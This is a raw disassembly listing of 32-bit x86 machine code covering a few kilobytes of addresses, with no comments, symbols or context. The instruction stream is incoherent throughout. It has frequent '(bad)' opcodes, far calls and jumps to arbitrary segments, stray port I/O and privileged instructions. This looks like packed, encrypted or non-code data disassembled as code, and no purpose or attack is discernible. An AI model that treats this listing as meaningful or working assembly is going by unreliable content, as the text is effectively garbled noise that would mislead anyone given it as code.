  4231de:	aad    0x7c
  4231e0:	and    ch,ah
  4231e2:	pop    ss
  4231e3:	xchg   BYTE PTR [edx+eiz*4-0xc],ah
  4231e7:	jbe    0x423238
  4231e9:	sbb    eax,0xa0d21b15
  4231ee:	mov    ah,0x94
  4231f0:	dec    esp
  4231f1:	psubsw mm2,mm0
  4231f4:	pop    ebp
  4231f5:	jmp    0x4231ee
  4231f7:	dec    edx
  4231f8:	inc    esi
  4231f9:	mov    ds:0xf0d91d2f,eax
  4231fe:	retf   0x5c49
  423201:	(bad)  [ebp-0x3d]
  423204:	shl    BYTE PTR [ecx],0xc3
  423207:	popf   
  423208:	jnp    0x4231d1
  42320a:	push   esp
  42320b:	xor    al,0x53
  42320d:	inc    edi
  42320e:	jbe    0x423202
  423210:	cmc    
  423211:	adc    eax,0xe4b4a7d3
  423216:	sub    BYTE PTR [ebx],ah
  423218:	sub    al,0x40
  42321a:	mov    esi,0x6b0b9af3
  42321f:	retf   0x92fb
  423222:	inc    esi
  423223:	out    dx,al
  423224:	pop    ecx
  423225:	sti    
  423226:	pop    ebx
  423227:	fcom   DWORD PTR [eax]
  423229:	sbb    BYTE PTR [eax+ecx*2-0x1],0x5
  42322e:	xchg   edx,eax
  42322f:	push   ebx
  423230:	sbb    eax,0x73566851
  423235:	add    cl,al
  423237:	lods   al,BYTE PTR ds:[esi]
  423238:	aaa    
  423239:	test   DWORD PTR [edi-0x60],0x94d9bbda
  423240:	shr    ebp,0xfe
  423243:	sub    BYTE PTR [edx+0x59],dh
  423246:	sub    edi,ecx
  423248:	or     al,0x60
  42324a:	dec    eax
  42324b:	leave  
  42324c:	mov    esi,0xfd2c0184
  423251:	jns    0x423263
  423253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423254:	std    
  423255:	mov    edx,edx
  423257:	jbe    0x4232a1
  423259:	pop    edi
  42325a:	or     BYTE PTR [esi],0x2d
  42325d:	loopne 0x423212
  42325f:	mov    ebp,0x2e144e8d
  423264:	loope  0x423225
  423266:	xchg   esi,eax
  423267:	pop    edx
  423268:	pop    edi
  423269:	mov    ah,0x7b
  42326b:	test   BYTE PTR [eax-0x706a3ead],ah
  423271:	sbb    eax,DWORD PTR ss:[edi]
  423274:	push   ds
  423275:	ja     0x423292
  423277:	mov    ebp,0x56221ef
  42327c:	and    al,0xcc
  42327e:	repnz add al,0x15
  423281:	push   eax
  423282:	and    al,al
  423284:	jns    0x423249
  423286:	ins    BYTE PTR es:[edi],dx
  423287:	jge    0x4232d1
  423289:	repnz xchg edi,eax
  42328b:	jge    0x423282
  42328d:	ret    
  42328e:	call   0x5574:0x4a2c172a
  423295:	addr16 aam 0xc7
  423298:	dec    ebp
  423299:	adc    dl,BYTE PTR [edi+0x352e9c71]
  42329f:	xchg   esi,eax
  4232a0:	jmp    0xda11f374
  4232a5:	cmp    BYTE PTR [eax+0x54],ch
  4232a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232a9:	lock gs add eax,0x854e4fe0
  4232b0:	sub    al,0xf
  4232b2:	push   ecx
  4232b3:	mov    eax,ds:0x38f605
  4232b8:	loop   0x42328d
  4232ba:	ret    
  4232bb:	add    eax,0x35539d44
  4232c0:	sbb    eax,0xdba4174b
  4232c5:	rcl    BYTE PTR [esi-0x56],cl
  4232c8:	dec    eax
  4232c9:	out    dx,eax
  4232ca:	int    0xe5
  4232cc:	pop    edx
  4232cd:	mov    ch,0x47
  4232cf:	push   es
  4232d0:	ret    0x67c7
  4232d3:	mov    cl,0xbd
  4232d5:	pop    ebx
  4232d6:	arpl   WORD PTR [edx+esi*2-0x6d],ax
  4232da:	mov    eax,ds:0x57250d5a
  4232df:	fcom   DWORD PTR [bp+di-0x5c]
  4232e3:	(bad)  
  4232e4:	out    dx,al
  4232e5:	adc    al,0x20
  4232e7:	push   ecx
  4232e8:	pop    es
  4232e9:	pop    ebp
  4232ea:	sbb    al,0xaf
  4232ec:	ds pop eax
  4232ee:	jae    0x4232a5
  4232f0:	ss ja  0x4232b0
  4232f3:	daa    
  4232f4:	inc    esp
  4232f5:	addr16 mov al,0xe8
  4232f8:	pop    DWORD PTR ds:0x53b97bd4
  4232fe:	fcomi  st,st(6)
  423300:	and    eax,0x2e6f446c
  423305:	xor    WORD PTR [ebx],di
  423308:	js     0x4232f0
  42330a:	and    dl,bl
  42330c:	push   edx
  42330d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42330e:	xchg   edi,eax
  42330f:	jl     0x423337
  423311:	lods   eax,DWORD PTR ds:[esi]
  423312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423313:	sub    al,0xdd
  423315:	sahf   
  423316:	rcl    di,cl
  423319:	dec    esi
  42331a:	cmp    edx,DWORD PTR [ebp+0x5c]
  42331d:	pop    es
  42331e:	jge    0x42339a
  423320:	inc    esp
  423321:	dec    esp
  423322:	in     al,0x40
  423324:	shr    BYTE PTR [ebx],0xc3
  423327:	inc    ecx
  423328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423329:	sub    BYTE PTR [ecx-0xc2ff6c2],dh
  42332f:	add    al,0xfa
  423331:	jae    0x4233b2
  423333:	mov    dl,0xe3
  423335:	mov    eax,ds:0x5f79edaf
  42333a:	leave  
  42333b:	xor    eax,DWORD PTR [ecx+0x46]
  42333e:	or     al,ch
  423340:	ret    
  423341:	call   0xdee3:0x657b62a8
  423348:	mov    ch,0x34
  42334a:	pushf  
  42334b:	sbb    DWORD PTR [ecx-0x56780fd4],esi
  423351:	push   es
  423352:	std    
  423353:	jl     0x4233cb
  423355:	and    al,0x60
  423357:	ret    0x89ab
  42335a:	inc    ebx
  42335b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42335c:	inc    bp
  42335e:	sti    
  42335f:	and    al,0xdf
  423361:	mov    WORD PTR [eax+0x7d56213e],?
  423367:	test   al,0x1c
  423369:	push   es
  42336a:	and    edi,DWORD PTR ds:0xdb51df57
  423370:	jge    0x4233c8
  423372:	scas   eax,DWORD PTR es:[edi]
  423373:	mov    ah,0x1e
  423375:	(bad)  
  423376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423377:	fstp   TBYTE PTR [ebp+ecx*4+0x3]
  42337b:	js     0x42331b
  42337d:	scas   eax,DWORD PTR es:[edi]
  42337e:	int3   
  42337f:	jae    0x4233fb
  423381:	jmp    0xb0d957c6
  423386:	loope  0x423350
  423388:	mov    al,ds:0x3042fd06
  42338d:	push   0x12
  42338f:	lock cs in eax,0x7a
  423393:	sbb    eax,0x6928f86f
  423398:	cmp    BYTE PTR [ebp-0x14879287],0x42
  42339f:	inc    edi
  4233a0:	sub    BYTE PTR [ebx+esi*8+0x6],0x3c
  4233a5:	sbb    eax,0xa9e433ab
  4233aa:	push   edx
  4233ab:	fcomp  DWORD PTR [eax]
  4233ad:	dec    edi
  4233ae:	inc    edi
  4233af:	push   ebx
  4233b0:	inc    esi
  4233b1:	std    
  4233b2:	call   0x398c:0x304489c1
  4233b9:	jb     0x42342d
  4233bb:	(bad)  
  4233bc:	jg     0x423414
  4233be:	in     eax,0xd7
  4233c0:	(bad)
  4233c4:	pop    edx
  4233c5:	test   al,0x8
  4233c7:	mov    ch,0xef
  4233c9:	xchg   edi,eax
  4233ca:	adc    eax,0x2f3094b2
  4233cf:	pop    esp
  4233d0:	leave  
  4233d1:	cwde   
  4233d2:	into   
  4233d3:	addr16 jnp 0x4233a8
  4233d6:	adc    al,0xce
  4233d8:	es dec edi
  4233da:	adc    bl,BYTE PTR [eax]
  4233dc:	dec    edx
  4233dd:	mov    WORD PTR [ebp+0x5d],gs
  4233e0:	aad    0x2a
  4233e2:	out    dx,al
  4233e3:	popf   
  4233e4:	mov    ebx,ds
  4233e6:	mov    esi,eax
  4233e8:	adc    BYTE PTR [edi+0x4f],cl
  4233eb:	ret    
  4233ec:	xlat   BYTE PTR ds:[ebx]
  4233ed:	mov    ds,WORD PTR [edx]
  4233ef:	xchg   edi,eax
  4233f0:	jo     0x4233c9
  4233f2:	loopne 0x42342c
  4233f4:	fidivr DWORD PTR [ecx+0x53]
  4233f7:	pop    ds
  4233f8:	dec    edi
  4233f9:	jbe    0x423444
  4233fb:	(bad)  
  4233fc:	pop    ss
  4233fd:	mov    eax,0xec377d57
  423402:	mov    WORD PTR [edx+0x9],gs
  423405:	push   0xdc9b5e99
  42340a:	popa   
  42340b:	aam    0x75
  42340d:	sti    
  42340e:	std    
  42340f:	scas   al,BYTE PTR es:[edi]
  423410:	cmp    BYTE PTR [edi],al
  423412:	cs stc 
  423414:	cmc    
  423415:	ret    
  423416:	dec    esi
  423417:	jnp    0x4233d6
  423419:	jns    0x42340f
  42341b:	adc    bl,al
  42341d:	loope  0x42344f
  42341f:	pop    ebp
  423420:	bound  edi,QWORD PTR [eax-0x13376245]
  423426:	sti    
  423427:	mov    dl,cl
  423429:	pop    esp
  42342a:	adc    DWORD PTR [ecx+0x69],esi
  42342d:	stos   BYTE PTR es:[edi],al
  42342e:	or     bl,bh
  423430:	jle    0x4233dc
  423432:	mov    bh,0x60
  423434:	repz pop ebp
  423436:	(bad)  
  423437:	jbe    0x4234ae
  423439:	sti    
  42343a:	popa   
  42343b:	jg     0x423409
  42343d:	les    edx,FWORD PTR [ecx+0x26cc0fa6]
  423443:	jno    0x4233f1
  423445:	mov    ds:0xa12fb0eb,al
  42344a:	push   ebp
  42344b:	in     eax,0x6e
  42344d:	dec    ebp
  42344e:	(bad)  
  42344f:	stc    
  423450:	enter  0xe9d7,0xa8
  423454:	mov    DWORD PTR [edi-0x645ed12e],esi
  42345a:	push   ecx
  42345b:	test   eax,0x418654b8
  423460:	mov    edx,fs
  423462:	or     bl,bl
  423464:	add    DWORD PTR [edi],esp
  423466:	hlt    
  423467:	(bad)  
  423468:	mov    ebx,0x4270435e
  42346d:	in     eax,dx
  42346e:	push   ebx
  42346f:	mov    ds:0x6eea1443,al
  423474:	lock in al,dx
  423476:	adc    DWORD PTR [edi],ebx
  423478:	cdq    
  423479:	jno    0x423415
  42347b:	aam    0x11
  42347d:	and    cl,BYTE PTR [eax+0xb5ce0e6]
  423483:	test   al,0x8c
  423485:	mov    gs,WORD PTR [ebx-0x36f87a56]
  42348b:	mov    ds:0x110c0aa9,al
  423490:	fdivr  DWORD PTR [ebp-0x155f81c7]
  423496:	and    DWORD PTR [edi],edx
  423498:	pop    ebx
  423499:	push   esp
  42349a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42349b:	pusha  
  42349c:	inc    esp
  42349d:	mov    esi,0xa370a6a5
  4234a2:	add    DWORD PTR [eax+0x6d47c2a5],ebp
  4234a8:	mov    edx,0xe0048d8d
  4234ad:	push   esp
  4234ae:	adc    ebp,DWORD PTR [eax+ecx*2]
  4234b1:	scas   al,BYTE PTR es:[edi]
  4234b2:	ins    BYTE PTR es:[edi],dx
  4234b3:	cld    
  4234b4:	sahf   
  4234b5:	in     al,dx
  4234b6:	(bad)  
  4234b7:	jae    0x423442
  4234b9:	adc    esi,DWORD PTR [ebx-0x5b]
  4234bc:	xchg   esi,eax
  4234bd:	lahf   
  4234be:	jo     0x42347b
  4234c0:	push   ecx
  4234c1:	test   eax,0xec4ac496
  4234c6:	jp     0x4234f2
  4234c8:	inc    edi
  4234c9:	jecxz  0x4234a4
  4234cb:	xchg   esi,eax
  4234cc:	fcomp  DWORD PTR [ecx]
  4234ce:	fdivr  QWORD PTR [ecx]
  4234d0:	es dec eax
  4234d2:	mov    bh,0x2c
  4234d4:	lea    ecx,[esi+edi*4]
  4234d7:	cmp    ecx,DWORD PTR [ecx+0x77]
  4234da:	add    ah,BYTE PTR [edx]
  4234dc:	xor    ah,cl
  4234de:	xor    BYTE PTR [edx-0x32],al
  4234e1:	fcomp  QWORD PTR [edx-0x3e]
  4234e4:	repnz push ebp
  4234e6:	ja     0x4234e8
  4234e8:	div    BYTE PTR [ecx]
  4234ea:	or     al,BYTE PTR [ebp-0x23]
  4234ed:	dec    ecx
  4234ee:	or     bl,bl
  4234f0:	loope  0x42354c
  4234f2:	push   ecx
  4234f3:	mov    eax,0xd880742
  4234f8:	cwde   
  4234f9:	fadd   st,st(3)
  4234fb:	jl     0x423489
  4234fd:	repz push ss
  4234ff:	idiv   BYTE PTR [esi]
  423501:	loope  0x4234df
  423503:	cmp    al,0x1c
  423505:	mov    eax,ds:0x6213d96e
  42350a:	mov    dh,0x6e
  42350c:	outs   dx,BYTE PTR ds:[esi]
  42350d:	sti    
  42350e:	pop    ebx
  42350f:	fadd   QWORD PTR [edi+0x18]
  423512:	ret    0x5af5
  423515:	in     al,dx
  423516:	dec    edx
  423517:	dec    edi
  423518:	ds cmp eax,0xc6b8b866
  42351e:	xchg   esi,eax
  42351f:	cld    
  423520:	mov    ds:0xecf269a2,al
  423525:	xor    DWORD PTR [ebp-0x75b87526],ecx
  42352b:	test   DWORD PTR [edx],esi
  42352d:	or     DWORD PTR [esp+eax*4-0xc],esi
  423531:	mov    dh,0x24
  423533:	sbb    DWORD PTR [ecx+0x2],eax
  423536:	or     cl,BYTE PTR [eax-0x30]
  423539:	cmp    cl,BYTE PTR [ebp+0x4e]
  42353c:	addr16 es mov ebx,gs
  423540:	jge    0x4235bb
  423542:	cmp    esp,ebx
  423544:	push   cs
  423545:	dec    edx
  423546:	out    0xa0,eax
  423548:	dec    al
  42354a:	jmp    0x19caeb4a
  42354f:	jbe    0x423585
  423551:	jmp    0x6aa97bbe
  423556:	jecxz  0x42351c
  423558:	cwde   
  423559:	arpl   WORD PTR [eax-0x5e34c167],dx
  42355f:	gs pop ecx
  423561:	jmp    0xfca14bb7
  423566:	scas   eax,DWORD PTR es:[edi]
  423567:	or     edx,ecx
  423569:	dec    esi
  42356a:	pusha  
  42356b:	rcr    BYTE PTR [ebx+0x5be79864],0xa4
  423572:	add    BYTE PTR [ebp-0x61],dl
  423575:	mov    edi,0xd45eeb92
  42357a:	das    
  42357b:	pop    ebp
  42357c:	xchg   ebp,eax
  42357d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42357e:	sti    
  42357f:	mov    ebp,0xd72a25ed
  423584:	jecxz  0x423522
  423586:	xchg   eax,ecx
  423588:	cmp    ah,dh
  42358a:	shr    BYTE PTR [eax-0x6193649e],0xec
  423591:	call   0x18b55da0
  423596:	ja     0x423568
  423598:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42359a:	add    dh,0xbc
  42359d:	jnp    0x4235e8
  42359f:	mov    edx,0xef301924
  4235a4:	(bad)  
  4235a5:	mov    al,0xfa
  4235a7:	out    dx,al
  4235a8:	cli    
  4235a9:	inc    edx
  4235aa:	call   0x57fb:0xb543e722
  4235b1:	int3   
  4235b2:	xchg   BYTE PTR [edx+0x763ca3e7],bh
  4235b8:	outs   dx,BYTE PTR ds:[esi]
  4235b9:	xchg   BYTE PTR [ecx],dh
  4235bb:	xchg   BYTE PTR [ebp+0x1c14cd4f],dl
  4235c1:	mov    ds:0xbe12bdbb,eax
  4235c6:	push   edx
  4235c7:	adc    al,0x57
  4235c9:	jle    0x4235fb
  4235cb:	jl     0x42355d
  4235cd:	shr    BYTE PTR [esi],cl
  4235cf:	test   eax,0x6164fc67
  4235d4:	mov    bl,0x1e
  4235d6:	shr    BYTE PTR [ebp-0x40],1
  4235d9:	adc    DWORD PTR [edx-0x1a6054ad],edx
  4235df:	push   edx
  4235e0:	(bad)  
  4235e1:	xchg   ebx,eax
  4235e2:	lods   eax,DWORD PTR ds:[esi]
  4235e3:	push   esp
  4235e4:	mov    ds:0xe4493283,eax
  4235e9:	les    ebx,FWORD PTR [ebx+0x3a488f48]
  4235ef:	push   edx
  4235f0:	mov    ebx,DWORD PTR [eax-0x21]
  4235f3:	jge    0x42361e
  4235f5:	jbe    0x4235b2
  4235f7:	mov    al,ds:0x48b8a0e4
  4235fc:	dec    ebx
  4235fd:	ins    DWORD PTR es:[edi],dx
  4235fe:	dec    ecx
  4235ff:	(bad)  
  423600:	sub    ecx,DWORD PTR [edi]
  423602:	push   ss
  423603:	adc    ah,dh
  423605:	mul    DWORD PTR [edx-0x45]
  423608:	mov    ebx,0x5321eb50
  42360d:	mov    ebp,0xa179de3a
  423612:	add    eax,0x6a4f157d
  423617:	cld    
  423618:	ret    
  423619:	mov    ds:0xc0c590e9,al
  42361e:	jmp    0x3d431b6a
  423623:	cmc    
  423624:	jb     0x4235c6
  423626:	push   eax
  423627:	(bad)  
  423628:	mov    cl,0x2e
  42362a:	push   ebp
  42362b:	bswap  ebp
  42362d:	pop    ebx
  42362e:	sub    edi,DWORD PTR [edx-0x192f5d65]
  423634:	jb     0x423652
  423636:	pop    edi
  423637:	pop    esi
  423638:	cmp    ecx,DWORD PTR [eax]
  42363a:	shr    DWORD PTR [ebp+0x5f9b2f4d],cl
  423640:	xor    BYTE PTR [edi],ah
  423642:	test   BYTE PTR [edx+eax*1],dh
  423645:	retf   0x28fa
  423648:	aas    
  423649:	and    eax,0xc2fb5b63
  42364e:	push   0x46fc9b37
  423653:	sbb    eax,0x5c8040df
  423658:	jl     0x423635
  42365a:	in     eax,dx
  42365b:	jbe    0x423622
  42365d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42365e:	mov    edx,esi
  423660:	das    
  423661:	push   cs
  423662:	int    0x5c
  423664:	sub    ah,BYTE PTR [ebx-0x6]
  423667:	cmp    dl,BYTE PTR [esi+0x35ba666a]
  42366d:	arpl   WORD PTR [esi+ebx*4-0x392a2c80],bp
  423674:	fldcw  WORD PTR [esi+ecx*1+0x32]
  423678:	xchg   ebx,eax
  423679:	dec    edx
  42367a:	fsubr  QWORD PTR [ebx+0x70586d1c]
  423680:	and    BYTE PTR [esi+0x2e47626a],cl
  423686:	mov    bl,0xf5
  423688:	aam    0x46
  42368a:	ja     0x42361a
  42368c:	sub    cl,BYTE PTR [edi+0x4b]
  42368f:	mov    eax,?
  423691:	sti    
  423692:	and    BYTE PTR [ebx-0x3eab7f09],bl
  423698:	sbb    bl,ch
  42369a:	jg     0x4236b2
  42369c:	(bad)  
  42369e:	mov    dh,0xcb
  4236a0:	push   ebx
  4236a1:	xchg   edx,eax
  4236a2:	aad    0x81
  4236a4:	adc    bl,BYTE PTR [ebp-0x65eee861]
  4236aa:	jo     0x423689
  4236ac:	jno    0x423729
  4236ae:	inc    edx
  4236af:	add    bh,BYTE PTR [eax]
  4236b1:	and    eax,0xb4c4bd21
  4236b6:	imul   esi,ebx,0x65
  4236b9:	xchg   edx,eax
  4236ba:	cmp    BYTE PTR [edx],cl
  4236bc:	mov    ecx,DWORD PTR [esp+esi*4+0x2f9bee9]
  4236c3:	icebp  
  4236c4:	imul   edi,esi,0x7621b039
  4236ca:	xchg   ecx,eax
  4236cb:	add    DWORD PTR [esp+edi*1+0x18],ebx
  4236cf:	out    0x8d,eax
  4236d1:	cmp    ecx,ebp
  4236d3:	rcr    DWORD PTR es:[edx-0x12],0xb6
  4236d8:	arpl   WORD PTR [ebx-0x2f],ax
  4236db:	bound  ebx,QWORD PTR [ebx-0x47]
  4236de:	arpl   dx,bp
  4236e0:	sub    ebx,DWORD PTR ds:0x96987bf3
  4236e6:	and    bh,ch
  4236e8:	cmp    eax,0x1666dc5f
  4236ed:	int3   
  4236ee:	loope  0x4236bf
  4236f0:	fld    TBYTE PTR [edx+edi*8+0x1e3a95d]
  4236f7:	push   ds
  4236f8:	mov    dh,0xc2
  4236fa:	clc    
  4236fb:	cs fs xor ch,dh
  4236ff:	call   0x7e30:0x385aa5d1
  423706:	inc    eax
  423707:	xlat   BYTE PTR ds:[ebx]
  423708:	jl     0x42371f
  42370a:	ja     0x423711
  42370c:	xor    esi,ebx
  42370e:	scas   al,BYTE PTR es:[edi]
  42370f:	mov    cs,WORD PTR [eax]
  423711:	lods   eax,DWORD PTR ds:[esi]
  423712:	hlt    
  423713:	out    dx,al
  423714:	add    ebp,DWORD PTR ds:0x708791cf
  42371a:	or     DWORD PTR [edx+ecx*2-0x47aaf9fa],esi
  423721:	test   eax,0x796b38df
  423726:	js     0x42371f
  423728:	add    eax,0xbf10d957
  42372d:	jbe    0x423780
  42372f:	inc    esi
  423730:	or     eax,0xe562649b
  423735:	fcmovnu st,st(7)
  423737:	call   0xca6359f4
  42373c:	or     eax,0xcdb3823a
  423741:	or     DWORD PTR [esi+ebp*4],esi
  423744:	sbb    dh,0xe6
  423747:	inc    ebx
  423748:	mov    BYTE PTR [ecx+0x52adab1e],dl
  42374e:	inc    esp
  42374f:	mov    eax,ds:0x1c2f8219
  423754:	sti    
  423755:	sub    eax,0x14bc87ca
  42375a:	cdq    
  42375b:	inc    ebp
  42375c:	xor    eax,0x553527ef
  423761:	push   ds
  423762:	add    bl,BYTE PTR [edi-0x35]
  423765:	inc    esp
  423766:	les    ebx,FWORD PTR [ebp+0x285df78b]
  42376c:	dec    esi
  42376e:	jne    0x423776
  423770:	sbb    eax,0xd61d343d
  423775:	dec    ecx
  423776:	xchg   bh,ah
  423778:	pop    ebx
  423779:	test   eax,0xba344ff0
  42377e:	pop    eax
  42377f:	add    ah,BYTE PTR [edx-0x7d]
  423782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423783:	jle    0x423763
  423785:	daa    
  423786:	dec    ebp
  423787:	cmp    eax,0x510b5192
  42378c:	mov    ecx,0x610e1b6e
  423791:	stos   DWORD PTR es:[edi],eax
  423792:	adc    bh,bh
  423794:	pop    ss
  423795:	inc    ecx
  423796:	fwait
  423797:	pusha  
  423798:	inc    ebp
  423799:	xor    esi,ebx
  42379b:	xchg   ecx,eax
  42379c:	inc    DWORD PTR [edi]
  42379e:	pop    ds
  42379f:	in     al,dx
  4237a0:	shl    ebx,cl
  4237a2:	pusha  
  4237a3:	ret    0xfe7
  4237a6:	mov    bh,0x4e
  4237a8:	fst    QWORD PTR [esi]
  4237aa:	push   ebx
  4237ab:	xor    al,0xde
  4237ad:	mov    eax,ds:0x20a95696
  4237b2:	cmc    
  4237b3:	add    edx,DWORD PTR [edi]
  4237b5:	(bad)  
  4237b6:	xor    BYTE PTR [ecx+edx*2],bh
  4237b9:	out    0xa8,eax
  4237bb:	mov    ah,0x21
  4237bd:	aaa    
  4237be:	dec    ecx
  4237bf:	inc    ebx
  4237c0:	jb     0x42383c
  4237c2:	aaa    
  4237c3:	dec    ebp
  4237c4:	dec    ecx
  4237c5:	pop    ebx
  4237c6:	stos   DWORD PTR es:[edi],eax
  4237c7:	xchg   DWORD PTR [eax-0x637a0617],edx
  4237cd:	cmp    DWORD PTR [ecx+0x32],ecx
  4237d0:	xchg   BYTE PTR [eax],cl
  4237d2:	mov    DWORD PTR ds:0x10d297ec,esp
  4237d8:	repnz aam 0xf
  4237db:	pop    esp
  4237dc:	mov    edx,0x598e503d
  4237e1:	cwde   
  4237e2:	fdiv   DWORD PTR [eax+0x7549f31b]
  4237e8:	ret    
  4237e9:	test   eax,0x51a0667e
  4237ee:	jb     0x4237d8
  4237f0:	sbb    bl,BYTE PTR [eax-0x5]
  4237f3:	jmp    0x1798:0xd99baca9
  4237fa:	add    edx,DWORD PTR [eax]
  4237fc:	push   cs
  4237fd:	nop
  4237fe:	add    DWORD PTR [edi],esi
  423800:	jbe    0x423861
  423802:	and    DWORD PTR [edi],edi
  423804:	imul   esi,DWORD PTR [esi],0x1b
  423807:	cmp    DWORD PTR [esi],esp
  423809:	jb     0x423867
  42380b:	sub    al,al
  42380d:	test   DWORD PTR [esi+0x47cd8498],ebx
  423813:	scas   al,BYTE PTR es:[edi]
  423814:	xchg   edx,eax
  423815:	neg    DWORD PTR ss:[ecx-0x3aae9de1]
  42381c:	add    bl,BYTE PTR [ecx]
  42381e:	adc    al,0x6e
  423821:	int    0x1a
  423823:	daa    
  423824:	xchg   edi,eax
  423825:	inc    edi
  423826:	sub    edx,0x26
  423829:	push   0xffffffa2
  42382b:	imul   eax,DWORD PTR [edi+esi*4],0x15
  42382f:	push   0xffffff95
  423831:	ins    DWORD PTR es:[edi],dx
  423832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423833:	out    0xc0,al
  423835:	mov    esp,0xc7ef1c37
  42383a:	repz pop esi
  42383c:	push   ds
  42383d:	fcmovnu st,st(2)
  42383f:	push   es
  423840:	jmp    0x676e:0x4f476e25
  423847:	dec    esi
  423848:	arpl   cx,di
  42384a:	aas    
  42384b:	sar    eax,0x2a
  42384e:	add    eax,0xb1d624e6
  423853:	push   ebp
  423854:	clc    
  423855:	push   ecx
  423856:	push   esp
  423857:	push   cs
  423858:	popf   
  423859:	int    0x50
  42385b:	pop    ebx
  42385c:	mov    ah,0x17
  42385e:	mov    edx,0x34ce0eee
  423863:	cmp    eax,0xd392bb4
  423868:	das    
  423869:	rcl    DWORD PTR [ecx+0x7],0x97
  42386d:	scas   eax,DWORD PTR es:[edi]
  42386e:	mov    esi,0xd8aee6a3
  423873:	iret   
  423874:	in     eax,0x14
  423876:	pop    es
  423877:	add    BYTE PTR ds:[eax],al
	...
  4238be:	mov    esp,0xf767f68f
  4238c3:	jg     0x423882
  4238c5:	fist   WORD PTR [esi+0x5aba792d]
  4238cb:	int3   
  4238cc:	push   ebp
  4238cd:	rcl    ch,0x28
  4238d0:	add    DWORD PTR [eax],eax
  4238d2:	and    al,BYTE PTR [edi]
  4238d4:	add    BYTE PTR [eax],al
  4238d6:	(bad)  
  4238d7:	hlt    
  4238d8:	outs   dx,BYTE PTR ds:[esi]
  4238d9:	sub    edi,ebx
  4238db:	call   0xcde5:0xbc77ca8e
  4238e2:	xor    dl,bh
  4238e4:	int    0x80
  4238e6:	jmp    0x2a47954d
  4238eb:	(bad)  
  4238ec:	jecxz  0x42392c
  4238ee:	stc    
  4238ef:	xchg   ebp,eax
  4238f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238f1:	outs   dx,BYTE PTR ds:[esi]
  4238f2:	pop    es
  4238f3:	aas    
  4238f4:	es pop es
  4238f6:	mov    ebx,0x39da467b
  4238fb:	cwde   
  4238fc:	xor    BYTE PTR [esi],ch
  4238fe:	push   cs
  4238ff:	push   esi
  423900:	gs aam 0x8a
  423903:	(bad)  
  423904:	hlt    
  423905:	mov    cl,0x3f
  423907:	pop    ecx
  423908:	ret    
  423909:	sub    eax,0x8475d082
  42390e:	sub    dh,BYTE PTR [edi+ebp*1]
  423911:	leave  
  423912:	ins    DWORD PTR es:[edi],dx
  423913:	push   0xffffff90
  423915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423916:	push   edi
  423917:	jmp    0x423941
  423919:	adc    eax,0x9f43dcd8
  42391e:	inc    ecx
  42391f:	je     0x42390e
  423921:	popf   
  423922:	bound  eax,QWORD PTR [ecx+0x4a]
  423925:	pop    es
  423926:	xor    eax,0xd9fb05e8
  42392b:	ins    BYTE PTR es:[edi],dx
  42392c:	hlt    
  42392d:	addr16 (bad) 
  42392f:	fcmovb st,st(3)
  423931:	push   esp
  423932:	(bad)
  423935:	repnz mov edi,0x7a224560
  42393b:	dec    edx
  42393c:	loopne 0x423924
  42393e:	inc    ebx
  42393f:	pop    edx
  423940:	push   ebp
  423941:	sbb    DWORD PTR [ebp+0x77],ecx
  423944:	lods   al,BYTE PTR ds:[esi]
  423945:	lahf   
  423946:	mov    dl,0x63
  423948:	mov    eax,0x4cd71cfc
  42394d:	sbb    ebx,DWORD PTR [edi]
  42394f:	sub    edx,edi
  423951:	mov    esp,DWORD PTR [edi]
  423953:	shr    cl,0x88
  423956:	sub    al,0xf8
  423958:	imul   ebp,DWORD PTR [ebx-0x742cac4e],0xfe2b1786
  423962:	adc    eax,0x27adde1b
  423967:	pop    DWORD PTR [esi+0x5f]
  42396a:	mov    ds:0x98ff8e05,eax
  42396f:	sub    eax,0x97b28897
  423974:	xchg   BYTE PTR [edx+ebp*1-0x577e6483],bh
  42397b:	sub    bl,BYTE PTR [esi]
  42397d:	ror    esp,1
  42397f:	adc    BYTE PTR ds:0x34ae49ed,ah
  423985:	add    DWORD PTR [ecx],edx
  423987:	add    dh,bl
  423989:	pop    edx
  42398a:	cmp    edx,0x13c30cbe
  423990:	pop    esi
  423991:	ss aam 0x10
  423994:	cwde   
  423995:	lock and DWORD PTR [ebp-0x536564f3],ebp
  42399c:	mov    es:0x2d4579c3,eax
  4239a2:	xchg   esi,eax
  4239a3:	cmp    DWORD PTR [ecx],0xffffffc6
  4239a6:	pop    ecx
  4239a7:	dec    ebx
  4239a8:	inc    edi
  4239a9:	adc    bh,BYTE PTR [esi+eax*4]
  4239ac:	std    
  4239ad:	out    dx,eax
  4239ae:	cld    
  4239af:	sahf   
  4239b0:	add    esp,DWORD PTR [esi]
  4239b2:	call   0xcfa4:0xfae9e7cd
  4239b9:	pop    ebp
  4239ba:	add    BYTE PTR [ebp-0xa],ah
  4239bd:	inc    esi
  4239be:	out    0xc4,al
  4239c0:	inc    ecx
  4239c1:	inc    esi
  4239c2:	fild   DWORD PTR [eax-0x42]
  4239c5:	mov    cl,0x8
  4239c7:	cwde   
  4239c8:	fisttp QWORD PTR [eax]
  4239ca:	(bad)  
  4239cb:	dec    edx
  4239cc:	sub    dl,dh
  4239ce:	add    ebp,ecx
  4239d0:	push   esi
  4239d1:	dec    ebp
  4239d2:	pushf  
  4239d3:	pop    ds
  4239d4:	pop    ds
  4239d5:	lahf   
  4239d6:	jl     0x4239f2
  4239d8:	add    ah,BYTE PTR [ebx+0x24]
  4239db:	jne    0x4239c4
  4239dd:	inc    esi
  4239de:	xlat   BYTE PTR ds:[ebx]
  4239df:	out    0x9a,eax
  4239e1:	outs   dx,DWORD PTR ds:[esi]
  4239e2:	inc    edx
  4239e3:	xchg   edx,eax
